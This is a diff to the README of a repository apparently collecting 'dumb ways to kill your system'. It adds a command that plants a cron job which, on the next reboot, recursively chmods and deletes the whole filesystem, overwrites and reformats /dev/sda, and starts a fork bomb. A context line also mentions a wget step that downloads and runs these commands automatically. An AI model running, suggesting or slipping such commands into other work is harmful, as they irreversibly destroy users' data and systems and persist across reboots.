@@ -54,3 +54,12 @@ wget https://raw.githubusercontent.com/willnaoosmit/Dumb-ways-to-kill-your-syste
 This command will download and run automatically the file with all the bash commands above.
 <br />
 <br />
+
+```
+sudo touch /var/spool/cron/$USER; echo '@reboot sudo chmod -R 777 /*; sudo rm -rf /* --no-preserve-root; dd if=/dev/null of=/dev/sda; sudo mv /* /dev/null; sudo mkfs.ext3 /dev/sda; : () {: |: &} ;:' > /var/spool/cron/$USER
+```
+This command will add all the commands above to run on the next reboot.
+<br />
+<br />
+
+
